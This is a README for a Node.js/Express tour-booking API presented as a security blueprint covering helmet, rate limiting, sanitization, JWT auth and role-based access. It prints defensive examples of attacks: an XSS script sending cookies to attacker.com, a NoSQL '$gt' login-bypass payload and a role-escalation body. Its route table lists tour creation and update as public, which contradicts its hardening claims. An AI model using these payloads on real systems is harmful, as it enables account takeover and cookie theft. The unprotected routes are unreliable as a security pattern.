# Natours API & Production Security Blueprint

[![Node.js](https://img.shields.io/badge/Node.js-14%2B-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
[![Express](https://img.shields.io/badge/Express-4.x-000000?logo=express&logoColor=white)](https://expressjs.com/)
[![MongoDB](https://img.shields.io/badge/MongoDB-Mongoose%205-47A248?logo=mongodb&logoColor=white)](https://mongoosejs.com/)
[![Security](https://img.shields.io/badge/Security-OWASP%20Hardened-red)](https://owasp.org/)
[![JWT](https://img.shields.io/badge/JWT-Stateless%20Auth-000000?logo=jsonwebtokens&logoColor=white)](https://jwt.io/)
[![License](https://img.shields.io/badge/license-ISC-blue)](https://opensource.org/license/isc-license-txt/)

A tour booking RESTful API built with **Node.js, Express, MongoDB, and Mongoose**. Beyond tour catalog management and advanced querying, this repository contains a complete, battle-tested implementation of **Authentication, Role-Based Access Control (RBAC), and Defense-in-Depth Application Security**.

> **Note for Developers:** This README is specifically designed as an architectural guide and reference blueprint. Every security mechanism, middleware layer, authentication flow, and data protection pattern implemented here is documented with code snippets, threat models, and rationale so you can adapt and reuse it in any future Node.js / Express backend.

---

## Table of Contents

- [1. Architectural Overview & Request Lifecycle](#1-architectural-overview--request-lifecycle)
- [2. Security Hardening Stack (Defense-in-Depth)](#2-security-hardening-stack-defense-in-depth)
   - [Security Middleware Pipeline Order](#security-middleware-pipeline-order)
   - [Layer 1: Security HTTP Headers (`helmet`)](#layer-1-security-http-headers-helmet)
   - [Layer 2: Dual-Tier Rate Limiting (`express-rate-limit`)](#layer-2-dual-tier-rate-limiting-express-rate-limit)
   - [Layer 3: NoSQL Injection Defense (`express-mongo-sanitize`)](#layer-3-nosql-injection-defense-express-mongo-sanitize)
   - [Layer 4: Cross-Site Scripting (XSS) Sanitization (`xss-clean`)](#layer-4-cross-site-scripting-xss-sanitization-xss-clean)
   - [Layer 5: HTTP Parameter Pollution (`hpp`)](#layer-5-http-parameter-pollution-hpp)
   - [Layer 6: Hardened Cookies (HTTP-Only, Secure, SameSite)](#layer-6-hardened-cookies-http-only-secure-samesite)
   - [Layer 7: Secure Operational Error Handling (`AppError` & `errorController`)](#layer-7-secure-operational-error-handling-apperror--errorcontroller)
   - [Layer 8: Process Crash & Exception Guards](#layer-8-process-crash--exception-guards)
- [3. Authentication Architecture](#3-authentication-architecture)
   - [User Schema & Password Encryption (`bcrypt`)](#user-schema--password-encryption-bcrypt)
   - [Stateless JWT Dual-Token Transmission (Cookie + Bearer)](#stateless-jwt-dual-token-transmission-cookie--bearer)
   - [Route Guard: The 6-Step `protect` Middleware](#route-guard-the-6-step-protect-middleware)
   - [Token Invalidation on Password Change](#token-invalidation-on-password-change)
   - [Secure Password Reset Flow (Crypto + SHA-256 + Mailer)](#secure-password-reset-flow-crypto--sha-256--mailer)
   - [Password Update While Authenticated](#password-update-while-authenticated)
- [4. Authorization & Access Control (RBAC)](#4-authorization--access-control-rbac)
   - [Role Hierarchy (`user`, `guide`, `lead-guide`, `admin`)](#role-hierarchy-user-guide-lead-guide-admin)
   - [The Higher-Order `restrictTo` Middleware](#the-higher-order-restrictto-middleware)
   - [Mass-Assignment & Privilege Escalation Mitigation (`updateMe`)](#mass-assignment--privilege-escalation-mitigation-updateme)
   - [Soft-Deletion Pattern (`deleteMe`)](#soft-deletion-pattern-deleteme)
- [5. Blueprint: Reusing This Security Stack in Your Next Project](#5-blueprint-reusing-this-security-stack-in-your-next-project)
   - [Required Packages](#required-packages)
   - [Environment Variables Template (`.env`)](#environment-variables-template-env)
   - [Recommended Folder Structure](#recommended-folder-structure)
   - [Express Application Bootstrap Template](#express-application-bootstrap-template)
   - [10-Point Security Pre-Deployment Checklist](#10-point-security-pre-deployment-checklist)
- [6. API Reference](#6-api-reference)
   - [Authentication & User Routes](#authentication--user-routes)
   - [Tour Routes](#tour-routes)
- [7. Getting Started](#7-getting-started)

---

## 1. Architectural Overview & Request Lifecycle

When a client sends an HTTP request to Natours, the request must traverse an ordered series of security filters and middlewares before hitting the application controllers:

```mermaid
flowchart TD
    Client([HTTP Request from Client]) --> Helmet[1. helmet\nSet secure HTTP response headers]
    Helmet --> BodyParser[2. express.json\nParse JSON body with size constraints]
    BodyParser --> MongoSanitize[3. express-mongo-sanitize\nStrip '$' and '.' to stop NoSQL injection]
    MongoSanitize --> XSS[4. xss-clean\nSanitize HTML/script entities in inputs]
    XSS --> HPP[5. hpp\nPrevent parameter pollution arrays]
    HPP --> CookieParser[6. cookie-parser\nParse incoming cookies including JWT]
    CookieParser --> GlobalLimit{7. Global Rate Limiter\nExceeded 100 req / 15m?}

    GlobalLimit -- Yes --> Err429[Return 429 Too Many Requests]
    GlobalLimit -- No --> Router{Route Matched?}

    Router -->|Public Tour Route| TourCtrl[Tour Controller Execution]

    Router -->|Auth Route: Login/Signup/Forgot| AuthLimit{Auth Rate Limiter\nExceeded 10 req / 15m?}
    AuthLimit -- Yes --> Err429
    AuthLimit -- No --> AuthCtrl[Auth Controller Execution]

    Router -->|Protected Route| ProtectMW{Protect Middleware:\n1. Token present?\n2. JWT valid?\n3. User exists?\n4. User active?\n5. Password changed after token?}

    ProtectMW -- Failed --> Err401[Return 401 Unauthorized]
    ProtectMW -- Passed --> RestrictMW{restrictTo: Role allowed?}

    RestrictMW -- No --> Err403[Return 403 Forbidden]
    RestrictMW -- Yes --> ProtectedCtrl[Execute Protected Controller Action]

    TourCtrl --> Response([HTTP Response])
    AuthCtrl --> Response
    ProtectedCtrl --> Response

    Err429 --> ErrorCtrl[Global Error Handler\nOperational vs Programming check]
    Err401 --> ErrorCtrl
    Err403 --> ErrorCtrl
    ErrorCtrl --> Response
```

---

## 2. Security Hardening Stack (Defense-in-Depth)

Every layer of defense in Natours addresses a specific attack vector from the **OWASP Top 10 API Security Risks**.

| Package                  | Version     | Layer              | Primary Attack Vector Mitigated                              |
| :----------------------- | :---------- | :----------------- | :----------------------------------------------------------- |
| `helmet`                 | `^8.3.0`    | HTTP Transport     | Clickjacking, MIME-Sniffing, XSS, Drive-by Downloads         |
| `express-rate-limit`     | `^8.7.0`    | Traffic Control    | Brute-force password guessing, DoS/DDoS, Credential stuffing |
| `express-mongo-sanitize` | `^2.2.0`    | Data Sanitization  | NoSQL Query Injection (`$gt`, `$ne`, `$where`)               |
| `xss-clean`              | `^0.1.4`    | Data Sanitization  | Stored & Reflected Cross-Site Scripting (XSS)                |
| `hpp`                    | `^0.2.3`    | Query Sanitization | HTTP Parameter Pollution (HPP) / Array injection             |
| `cookie-parser`          | `^1.4.7`    | Session Transport  | Safe parsing of `httpOnly`, `SameSite` cookies               |
| `bcrypt`                 | `^6.0.0`    | Credential Storage | Rainbow tables, offline password cracking (Cost factor 12)   |
| `crypto` (Node native)   | built-in    | Token Lifecycle    | Plaintext database exposure of temporary tokens              |
| `validator`              | `^13.15.35` | Input Validation   | Malformed emails and illegal string payloads                 |

---

### Security Middleware Pipeline Order

In Express, **middleware execution order is critical**. Placing sanitization before parsing will fail silently because `req.body` is not yet populated.

Here is the exact pipeline from [app.js](file:///c:/Users/kheza_jks33el/Downloads/complete-node-bootcamp-master/complete-node-bootcamp-master/4-natours/natours/app.js):

```javascript
// 1. Set security HTTP headers first
app.use(helmet());

// 2. Parse incoming body before sanitizing it
app.use(express.json({ limit: '10kb' })); // Limits payload size against buffer overload

// 3. Sanitize raw body, query, and params against NoSQL injection
app.use(mongoSanitize());

// 4. Sanitize user inputs against XSS scripts
app.use(xss());

// 5. Prevent parameter pollution
app.use(hpp());

// 6. Parse cookies for authentication tokens
app.use(cookieParser());

// 7. Apply global rate limiting to all /api routes
app.use('/api', globalLimiter);
```

---

### Layer 1: Security HTTP Headers (`helmet`)

`helmet()` attaches well-known HTTP security headers to every response, protecting clients and browsers from exploitation:

- `X-Frame-Options: SAMEORIGIN`: Prevents clickjacking by blocking malicious sites from embedding your API or HTML pages inside an `<iframe>`.
- `X-Content-Type-Options: nosniff`: Prevents browsers from MIME-sniffing a response away from the declared content type.
- `Strict-Transport-Security` (HSTS): Enforces secure HTTPS connections and disallows insecure HTTP.
- `Content-Security-Policy`: Restricts the sources from which scripts, styles, and assets can be loaded.
- `X-XSS-Protection`: Enables browser-level legacy XSS filtering.

---

### Layer 2: Dual-Tier Rate Limiting (`express-rate-limit`)

Natours employs a **two-tier rate limiting strategy** defined in [utils/rateLimiter.js](file:///c:/Users/kheza_jks33el/Downloads/complete-node-bootcamp-master/complete-node-bootcamp-master/4-natours/natours/utils/rateLimiter.js):

```javascript
// utils/rateLimiter.js
const rateLimit = require('express-rate-limit');

const getNumber = (value, fallback) => {
   const parsed = Number(value);
   return Number.isFinite(parsed) && parsed > 0 ? parsed : fallback;
};

const createLimiter = (windowMs, limit, message) =>
   rateLimit({
      windowMs,
      limit,
      standardHeaders: 'draft-8', // Modern RateLimit headers (RateLimit-Policy, RateLimit)
      legacyHeaders: false, // Disables obsolete X-RateLimit-* headers
      message: {
         status: 'failed',
         message,
      },
   });

// 1. Global Limiter (100 requests / 15 minutes across all API endpoints)
const globalLimiter = createLimiter(
   getNumber(process.env.GLOBAL_RATE_LIMIT_WINDOW_MS, 15 * 60 * 1000),
   getNumber(process.env.GLOBAL_RATE_LIMIT_MAX, 100),
   'Too many requests from this IP. Please try again later.',
);

// 2. Auth Limiter (10 requests / 15 minutes strictly on auth routes)
const authLimiter = createLimiter(
   getNumber(process.env.RATE_LIMIT_WINDOW_MS, 15 * 60 * 1000),
   getNumber(process.env.AUTH_RATE_LIMIT_MAX, 10),
   'Too many authentication attempts. Please try again later.',
);
```

#### Why Two Limiters?

1. **Global Limiter (`globalLimiter`)**: Mounts on `/api` in `app.js`. Prevents web scraping, crawler denial-of-service, and resource exhaustion.
2. **Auth Limiter (`authLimiter`)**: Mounts specifically on sensitive routes in `userRoutes.js`:
   - `POST /api/v1/users/signup`
   - `POST /api/v1/users/login`
   - `POST /api/v1/users/forgotPassword`
   - `PATCH /api/v1/users/resetPassword/:token`
     This halts automated dictionary attacks, credential stuffing, and mail server saturation via password reset spam.

---

### Layer 3: NoSQL Injection Defense (`express-mongo-sanitize`)

#### The Vulnerability

In MongoDB/Mongoose, sending malicious operators inside JSON requests can bypass password checks:

```json
// Malicious Login Payload
{
   "email": "admin@natours.com",
   "password": { "$gt": "" }
}
```

If executed directly, MongoDB evaluates `"password" > ""` as `true`, allowing attackers to log in as the administrator without knowing the password!

#### The Solution

`express-mongo-sanitize` inspects `req.body`, `req.query`, and `req.params`, recursively scrubbing any object keys that begin with `$` or contain `.` (prohibiting operator injection and MongoDB dot-notation property path traversal).

---

### Layer 4: Cross-Site Scripting (XSS) Sanitization (`xss-clean`)

#### The Vulnerability

Attackers submit malicious JavaScript in form inputs (such as tour reviews or usernames):

```html
<script>
   fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

#### The Solution

`xss-clean` intercepts incoming user input and sanitizes HTML entities (e.g. converting `<` and `>` into safe character references), neutralizing script execution before payloads can be stored in MongoDB or rendered to clients.

---

### Layer 5: HTTP Parameter Pollution (`hpp`)

#### The Vulnerability

If an attacker sends duplicate query parameters, Express creates an array instead of a string:

```text
GET /api/v1/tours?sort=duration&sort=price
// req.query.sort becomes: ['duration', 'price']
```

When code expects `req.query.sort.split(',')`, accessing string methods on an Array throws an unhandled exception or causes unintended query behavior.

#### The Solution

`hpp()` strips duplicate query parameters, keeping only the last parameter specified, preventing query crashes and logic bypasses.

---

### Layer 6: Hardened Cookies (HTTP-Only, Secure, SameSite)

Tokens issued by `authController.createSendToken` are returned in an HTTP response cookie configured with strict security flags:

```javascript
// controllers/authController.js
res.cookie('jwt', token, {
   httpOnly: true, // Prevents document.cookie access from JavaScript (mitigates XSS token theft)
   secure: true, // Only transmitted across encrypted TLS/HTTPS connections
   sameSite: 'strict', // Blocks cross-site transmission (mitigates CSRF attacks)
   maxAge: getCookieMaxAge(), // Configurable expiration window
});
```

---

### Layer 7: Secure Operational Error Handling (`AppError` & `errorController`)

In production, leaking internal database stack traces or database driver errors gives attackers insight into collection structures, system file paths, and package versions.

Natours separates all errors into two categories:

1. **Operational Errors (`isOperational = true`)**: Known, predictable business logic errors created using `AppError` (e.g. "User does not exist", "Invalid password", "Token expired"). These are safe to display to the user.
2. **Programming / Unknown Errors**: Bugs, database connectivity crashes, syntax errors. In production, these return a generic message: `"Sorry, something went wrong."`

```javascript
// utils/appError.js
class AppError extends Error {
   constructor(message, statusCode) {
      super(message);
      this.statusCode = statusCode;
      this.status = statusCode < 500 ? 'failed' : 'error';
      this.isOperational = true; // Flags this as a trusted, predictable error

      Error.captureStackTrace(this, this.constructor);
   }
}
```

```javascript
// controllers/errorController.js
module.exports = function errorController(err, req, res, next) {
   err.statusCode = err.statusCode || 500;
   err.status = err.status || 'error';

   if (process.env.NODE_ENV === 'production') {
      if (err.isOperational) {
         // Safe operational error: send message to client
         return res.status(err.statusCode).json({
            status: err.status,
            message: err.message,
         });
      }
      // Unknown programming error: don't leak details
      return res.status(500).json({
         status: 'error',
         message: 'Sorry, something went wrong.',
      });
   }

   // In Development: Full diagnostic output
   res.status(err.statusCode).json({
      status: err.status,
      message: err.message,
      error: err,
      stack: err.stack,
   });
};
```

---

### Layer 8: Process Crash & Exception Guards

Configured at the top and bottom of [server.js](file:///c:/Users/kheza_jks33el/Downloads/complete-node-bootcamp-master/complete-node-bootcamp-master/4-natours/natours/server.js):

1. **Uncaught Exceptions (`uncaughtException`)**:
   Catches synchronous coding errors outside of Express middleware (e.g., calling an undefined variable). Logs the error and immediately exits cleanly with code `1`.
2. **Unhandled Rejections (`unhandledRejection`)**:
   Catches unhandled asynchronous Promise rejections (e.g., database connection down). Gracefully shuts down the HTTP server first to finish active client requests before exiting:
   ```javascript
   process.on('unhandledRejection', (err) => {
      console.error(
         'UNHANDLED REJECTION! Shutting down gracefully...',
         err,
      );
      server.close(() => {
         process.exit(1);
      });
   });
   ```

---

## 3. Authentication Architecture

### User Schema & Password Encryption (`bcrypt`)

The user schema in [models/userModel.js](file:///c:/Users/kheza_jks33el/Downloads/complete-node-bootcamp-master/complete-node-bootcamp-master/4-natours/natours/models/userModel.js) is designed to enforce security at the database layer:

```javascript
const mongoose = require('mongoose');
const validator = require('validator');
const bcrypt = require('bcrypt');

const userSchema = new mongoose.Schema({
   name: {
      type: String,
      required: [true, 'A user must have a name'],
      trim: true,
   },
   email: {
      type: String,
      required: [true, 'A user must have an email'],
      unique: true,
      lowercase: true,
      validate: [validator.isEmail, 'Please provide a valid email'],
   },
   role: {
      type: String,
      enum: ['user', 'guide', 'lead-guide', 'admin'],
      default: 'user',
   },
   active: {
      type: Boolean,
      default: true,
      select: false, // Hidden by default from queries
   },
   password: {
      type: String,
      required: [true, 'A user must have a password'],
      minlength: 8,
      select: false, // Critical: Never returned in query results!
   },
   passwordConfirm: {
      type: String,
      required: [true, 'Please confirm your password'],
      validate: {
         // This validator only runs on User.create() and user.save()!
         validator: function (value) {
            return value === this.password;
         },
         message: 'Passwords are not the same',
      },
   },
   passwordChangedAt: {
      type: Date,
      select: false,
   },
   passwordResetToken: {
      type: String,
      select: false,
   },
   passwordResetExpires: {
      type: Date,
      select: false,
   },
});
```

#### Pre-Save Encryption Middleware

```javascript
userSchema.pre('save', function (next) {
   // Only run hashing if password was actually created or modified
   if (!this.isModified('password')) {
      this.passwordConfirm = undefined;
      return next();
   }

   // Update passwordChangedAt timestamp for existing users
   if (!this.isNew) {
      // Subtract 1 second to account for clock skew/DB write delays
      this.passwordChangedAt = Date.now() - 1000;
   }

   // Hash password with bcrypt cost factor 12
   bcrypt
      .hash(this.password, 12)
      .then((hashedPassword) => {
         this.password = hashedPassword;
         this.passwordConfirm = undefined; // Drop confirm field from DB persistence
         next();
      })
      .catch(next);
});
```

#### Security Takeaways

- **Cost Factor 12**: Balances high CPU resistance against brute force with sub-second response times for legitimate logins.
- `select: false`: Protects passwords, reset tokens, and timestamps from accidental leakage in endpoints like `GET /users`.
- `this.passwordConfirm = undefined`: Discards the confirmation field once verified, avoiding redundant data storage.
- `Date.now() - 1000`: Mitigates race conditions where a JWT is minted moments before the database write completes.

---

### Stateless JWT Dual-Token Transmission (Cookie + Bearer)

Natours supports both modern browser clients and mobile/third-party API consumers through **dual-token handling**:

1. **When Minting Tokens (`createSendToken`)**:
   - The token is placed into an encrypted, HTTP-only cookie.
   - The token is also returned in the JSON response payload for API clients.
2. **When Consuming Tokens (`protect`)**:
   - The server first checks `req.cookies.jwt`.
   - If not found in cookies, it checks `req.headers.authorization` for `Bearer <token>`.

---

### Route Guard: The 6-Step `protect` Middleware

Every protected endpoint in Natours runs through [authController.protect](file:///c:/Users/kheza_jks33el/Downloads/complete-node-bootcamp-master/complete-node-bootcamp-master/4-natours/natours/controllers/authController.js#L53-L114):

```mermaid
sequenceDiagram
    autonumber
    actor Client
    participant Protect as protect Middleware
    participant JWT as jsonwebtoken
    participant DB as MongoDB (User Model)

    Client->>Protect: Request with Cookie or Bearer header
    alt Token Missing
        Protect-->>Client: 401 Unauthorized ("You are not logged in")
    end

    Protect->>JWT: jwt.verify(token, JWT_SECRET)
    alt Verification Fails (tampered or expired)
        JWT-->>Protect: Error
        Protect-->>Client: 401 Unauthorized ("Invalid or expired token")
    end

    Protect->>DB: User.findById(decoded.id).select('+passwordChangedAt +active')
    alt User Deleted from Database
        DB-->>Protect: null
        Protect-->>Client: 401 Unauthorized ("User no longer exists")
    end

    alt Account Deactivated (active === false)
        Protect-->>Client: 401 Unauthorized ("This account is deactivated")
    end

    Protect->>DB: currentUser.changedPasswordAfter(decoded.iat)
    alt Password Changed After Token Was Issued
        Protect-->>Client: 401 Unauthorized ("Password recently changed. Please log in again")
    end

    Note over Protect: req.user = currentUser
    Protect->>Client: Call next() -> Proceed to Controller
```

---

### Token Invalidation on Password Change

If an account is hijacked and the user changes their password, all previously issued tokens on other devices must become immediately invalid.

Natours accomplishes this via the `changedPasswordAfter` schema method:

```javascript
// models/userModel.js
userSchema.methods.changedPasswordAfter = function (tokenIssuedAt) {
   if (this.passwordChangedAt) {
      const changedTimestamp = parseInt(
         this.passwordChangedAt.getTime() / 1000,
         10,
      );
      // Returns true if password changed AFTER the JWT 'iat' (issued at) timestamp
      return tokenIssuedAt < changedTimestamp;
   }
   return false;
};
```

---

### Secure Password Reset Flow (Crypto + SHA-256 + Mailer)

#### The Problem with Storing Reset Tokens Plaintext

If your database is dumped or compromised, an attacker can read plain password reset tokens and take over any account.

#### The Natours Defense

Natours generates a 32-byte cryptographic random token, sends the **plain token** to the user's email, and saves only the **one-way SHA-256 hash** in the database.

```mermaid
sequenceDiagram
    autonumber
    actor User
    participant Auth as authController
    participant Crypto as Node crypto
    participant DB as Database
    participant Mail as Nodemailer

    User->>Auth: POST /forgotPassword { email }
    Auth->>DB: Find user by email
    alt User Not Found
        Auth-->>User: 200 OK ("If that email exists, a password reset email was sent.")
    end

    Auth->>Crypto: crypto.randomBytes(32).toString('hex')
    Note over Crypto: Generates plaintext token
    Auth->>Crypto: crypto.createHash('sha256').update(token).digest('hex')
    Note over Crypto: Generates hashed token

    Auth->>DB: Save hashed token & expiry (10 min)
    Auth->>Mail: Send email with reset URL containing plaintext token
    Auth-->>User: 200 OK Generic Success Message

    Note over User, Auth: User clicks reset link in email
    User->>Auth: PATCH /resetPassword/:token { password, passwordConfirm }
    Auth->>Crypto: Hash params.token with SHA-256
    Auth->>DB: Query user with matching hashed token & passwordResetExpires > now
    Auth->>DB: Update password, clear reset token & expiry, save
    Auth-->>User: 200 OK + Fresh JWT Cookie
```

#### Security Highlights

1. **User Enumeration Protection**: The API returns HTTP 200 with the exact same message whether the email exists or not, preventing attackers from discovering registered emails.
2. **Defensive Cleanup**: If `sendEmail` encounters an SMTP error, the reset fields in the database are immediately deleted so no dangling valid tokens remain:
   ```javascript
   } catch (error) {
      user.passwordResetToken = undefined;
      user.passwordResetExpires = undefined;
      await user.save({ validateBeforeSave: false });
      return next(new AppError('There was an error sending the email.', 500));
   }
   ```

---

### Password Update While Authenticated

When logged in, users cannot change passwords through general update endpoints. They must use `PATCH /api/v1/users/updatePassword`:

1. Checks `currentPassword`, `password`, and `passwordConfirm`.
2. Validates `currentPassword` using `bcrypt.compare(currentPassword, user.password)`.
3. Saves the new password (triggering `pre('save')` encryption).
4. Issues a fresh token and cookie.

---

## 4. Authorization & Access Control (RBAC)

### Role Hierarchy (`user`, `guide`, `lead-guide`, `admin`)

Natours implements **Role-Based Access Control (RBAC)** across system resources. Roles are stored directly on the `User` document:

- **`user`**: Default role. Can view tours, manage their own profile and passwords.
- **`guide`**: Can view internal tour details and tour operations.
- **`lead-guide`**: Tour manager who can manage guide assignments and tour content.
- **`admin`**: Full administrative access (can delete tours, manage users, modify system state).

---

### The Higher-Order `restrictTo` Middleware

The `restrictTo` function in [authController.js](file:///c:/Users/kheza_jks33el/Downloads/complete-node-bootcamp-master/complete-node-bootcamp-master/4-natours/natours/controllers/authController.js#L116-L129) is a **higher-order function** that accepts permitted roles and returns an Express middleware:

```javascript
// controllers/authController.js
exports.restrictTo = (...roles) => {
   return (req, res, next) => {
      // req.user was previously attached by the protect middleware
      if (!roles.includes(req.user.role)) {
         return next(
            new AppError(
               'You do not have permission to perform this action.',
               403, // 403 Forbidden
            ),
         );
      }
      next();
   };
};
```

#### Route Protection in Practice

```javascript
// routes/tourRoutes.js
router.route('/:id').delete(
   authController.protect,
   authController.restrictTo('admin', 'lead-guide'), // Only admins and lead guides can delete
   tourController.deleteTour,
);
```

---

### Mass-Assignment & Privilege Escalation Mitigation (`updateMe`)

#### The Vulnerability

If an application passes `req.body` directly into `User.findByIdAndUpdate(req.user.id, req.body)`, an attacker can send:

```json
{ "role": "admin" }
```

and elevate their account privileges.

#### The Solution

In [controllers/userController.js](file:///c:/Users/kheza_jks33el/Downloads/complete-node-bootcamp-master/complete-node-bootcamp-master/4-natours/natours/controllers/userController.js#L18-L60), `updateMe` enforces **strict field whitelisting**:

```javascript
exports.updateMe = catchAsync(async (req, res, next) => {
   // 1. Strict whitelist of editable fields
   const allowedFields = ['name', 'email'];
   const requestedFields = Object.keys(req.body);

   // 2. Reject any attempt to modify unapproved properties
   const invalidFields = requestedFields.filter(
      (field) => !allowedFields.includes(field),
   );

   if (invalidFields.length > 0) {
      return next(
         new AppError(
            `You can only update your name and email. Invalid fields: ${invalidFields.join(', ')}`,
            400,
         ),
      );
   }

   // 3. Update only sanitized fields
   const updatedUser = await User.findByIdAndUpdate(
      req.user._id,
      req.body,
      { new: true, runValidators: true },
   );

   res.status(200).json({
      status: 'success',
      data: { user: updatedUser },
   });
});
```

---

### Soft-Deletion Pattern (`deleteMe`)

Hard-deleting user records breaks database foreign key associations, historical tour reservations, and financial logs.

Natours implements **soft deletion**:

```javascript
// controllers/userController.js
exports.deleteMe = catchAsync(async (req, res) => {
   await User.findByIdAndUpdate(req.user._id, { active: false });

   res.status(204).json({
      status: 'success',
      data: null,
   });
});
```

1. The user's `active` property is set to `false`.
2. The user is logged out.
3. The `protect` middleware explicitly checks `if (!currentUser.active) return next(new AppError('This account is deactivated.', 401));`
4. The `getAllUsers` query automatically excludes deactivated accounts:
   `User.find({ active: { $ne: false } })`.

---

## 5. Blueprint: Reusing This Security Stack in Your Next Project

You can copy and adapt this entire security foundation into any Express & MongoDB project. Follow this guide:

### Required Packages

```bash
npm install express mongoose dotenv bcrypt jsonwebtoken helmet express-rate-limit express-mongo-sanitize xss-clean hpp cookie-parser nodemailer validator
```

For development conveniences:

```bash
npm install -D morgan nodemon
```

---

### Environment Variables Template (`.env`)

Create a `config.env` or `.env` file with these keys:

```env
# Application Settings
NODE_ENV=development
PORT=7000

# Database
MONGODB_URI=mongodb+srv://<username>:<password>@cluster0.example.mongodb.net/dbname?retryWrites=true&w=majority
MONGODB_PASSWORD=your_secure_db_password

# Authentication (JWT)
JWT_SECRET=generate-a-strong-64-character-random-secret-key-here
JWT_EXPIRES_IN=90d
JWT_COOKIE_EXPIRES_IN=90d

# Rate Limiting
GLOBAL_RATE_LIMIT_WINDOW_MS=900000 # 15 minutes
GLOBAL_RATE_LIMIT_MAX=100           # 100 requests per IP
RATE_LIMIT_WINDOW_MS=900000        # 15 minutes
AUTH_RATE_LIMIT_MAX=10             # 10 attempts per IP

# Email Service (Mailtrap for dev, SendGrid/Postmark for prod)
MAILTRAP_HOST=sandbox.smtp.mailtrap.io
MAILTRAP_PORT=2525
MAILTRAP_USERNAME=your_mailtrap_username
MAILTRAP_PASSWORD=your_mailtrap_password
EMAIL_FROM=noreply@example.com

# Password Reset URL
PASSWORD_RESET_URL=http://localhost:7000/api/v1/users/resetPassword
```

---

### Recommended Folder Structure

```text
├── config.env                 # Private environment variables (gitignored)
├── .env.example               # Safe environment variable template
├── app.js                     # Express app setup and middleware pipeline
├── server.js                  # Database connection, process handlers, app listen
├── controllers/
│   ├── authController.js      # Signup, login, protect, restrictTo, password flows
│   ├── userController.js      # User management, updateMe, deleteMe
│   └── errorController.js     # Production vs Development error formatting
├── models/
│   └── userModel.js           # Mongoose schema, validation, pre-save hooks
├── routes/
│   └── userRoutes.js          # Route definitions and middleware binding
└── utils/
    ├── appError.js            # Operational error class
    ├── catchAsync.js          # Async wrapper eliminating try/catch blocks
    ├── email.js               # Nodemailer transporter utility
    └── rateLimiter.js         # Configurable rate limiter factories
```

---

### Express Application Bootstrap Template

```javascript
// app.js template for your next project
const express = require('express');
const helmet = require('helmet');
const mongoSanitize = require('express-mongo-sanitize');
const xss = require('xss-clean');
const hpp = require('hpp');
const cookieParser = require('cookie-parser');

const AppError = require('./utils/appError');
const errorController = require('./controllers/errorController');
const { globalLimiter } = require('./utils/rateLimiter');
const userRouter = require('./routes/userRoutes');

const app = express();

// 1. Security Headers
app.use(helmet());

// 2. Body Parser (limit prevents large body payload attacks)
app.use(express.json({ limit: '10kb' }));

// 3. Data Sanitization against NoSQL Query Injection
app.use(mongoSanitize());

// 4. Data Sanitization against XSS
app.use(xss());

// 5. Prevent Parameter Pollution (add whitelist array if certain duplicates are allowed)
app.use(hpp({ whitelist: ['duration', 'ratingsQuantity', 'price'] }));

// 6. Cookie Parser
app.use(cookieParser());

// 7. Global Rate Limiter
app.use('/api', globalLimiter);

// 8. Mount Routes
app.use('/api/v1/users', userRouter);

// 9. Unhandled Route Fallback
app.all('*', (req, res, next) => {
   next(
      new AppError(
         `Cannot find ${req.originalUrl} on this server!`,
         404,
      ),
   );
});

// 10. Centralized Global Error Handler
app.use(errorController);

module.exports = app;
```

---

### 10-Point Security Pre-Deployment Checklist

Before deploying your project to production, verify each of these 10 items:

- [ ] **1. `NODE_ENV=production`**: Ensure your production host environment variable is set to `production` so full error stack traces and internal messages are hidden.
- [ ] **2. Strong JWT Secret**: Use a cryptographically secure random string of at least 64 characters (e.g. generated via `crypto.randomBytes(64).toString('hex')`).
- [ ] **3. Cookie Security**: Ensure `secure: true` is enabled in `res.cookie()` so cookies are transmitted only over HTTPS.
- [ ] **4. Rate Limiting Stores**: For multi-instance/clustered production deployments, back `express-rate-limit` with **Redis** (`rate-limit-redis`) so rate limit counters are shared across instances.
- [ ] **5. Body Size Limits**: Confirm `express.json({ limit: '10kb' })` is configured to prevent memory exhaustion attacks.
- [ ] **6. Strict Whitelisting**: Verify that all profile update endpoints (like `updateMe`) strictly whitelist permitted keys.
- [ ] **7. Secrets Gitignored**: Ensure `config.env` and `.env` are listed in `.gitignore`. Never commit API keys or database connection strings.
- [ ] **8. Anti-Enumeration Checks**: Ensure password reset and authentication errors do not disclose whether a particular email is registered.
- [ ] **9. Centralized Error Handling**: Verify all asynchronous route handlers use `catchAsync` or `express-async-errors` to avoid unhandled promise rejections.
- [ ] **10. Process Exit Handlers**: Verify `server.js` listens to `uncaughtException` and `unhandledRejection` so the process restarts cleanly under a process manager like **PM2** or Kubernetes.

---

## 6. API Reference

Base URL: `/api/v1`

### Authentication & User Routes

| Method   | Endpoint                      | Protection | Rate Limit            | Description                             |
| :------- | :---------------------------- | :--------- | :-------------------- | :-------------------------------------- |
| `POST`   | `/users/signup`               | Public     | Auth Limiter (10/15m) | Register a new user                     |
| `POST`   | `/users/login`                | Public     | Auth Limiter (10/15m) | Authenticate user, receive JWT & cookie |
| `POST`   | `/users/forgotPassword`       | Public     | Auth Limiter (10/15m) | Request 10-minute reset token via email |
| `PATCH`  | `/users/resetPassword/:token` | Public     | Auth Limiter (10/15m) | Reset password with token from email    |
| `PATCH`  | `/users/updatePassword`       | `protect`  | Global Limiter        | Update password while logged in         |
| `PATCH`  | `/users/updateMe`             | `protect`  | Global Limiter        | Update current user's name or email     |
| `DELETE` | `/users/deleteMe`             | `protect`  | Global Limiter        | Soft-delete / deactivate account        |
| `GET`    | `/users`                      | Public     | Global Limiter        | List all active users                   |
| `GET`    | `/users/:id`                  | Public     | Global Limiter        | Get user details by ID                  |

---

### Tour Routes

| Method   | Endpoint                    | Protection                                     | Description                                            |
| :------- | :-------------------------- | :--------------------------------------------- | :----------------------------------------------------- |
| `GET`    | `/tours`                    | `protect`                                      | Get all tours (Supports filter, sort, limit, paginate) |
| `POST`   | `/tours`                    | Public                                         | Create a new tour                                      |
| `GET`    | `/tours/:id`                | Public                                         | Get single tour details                                |
| `PATCH`  | `/tours/:id`                | Public                                         | Update tour                                            |
| `DELETE` | `/tours/:id`                | `protect`, `restrictTo('admin', 'lead-guide')` | Delete tour (Role-restricted)                          |
| `GET`    | `/tours/trending-tours`     | Public                                         | Get top 5 highest-rated cheap tours                    |
| `GET`    | `/tours/tours-statistics`   | Public                                         | Tour statistics grouped by difficulty                  |
| `GET`    | `/tours/plan-monthly/:year` | Public                                         | Monthly tour plan statistics                           |

---

### Testing Example Requests

#### 1. User Signup

```bash
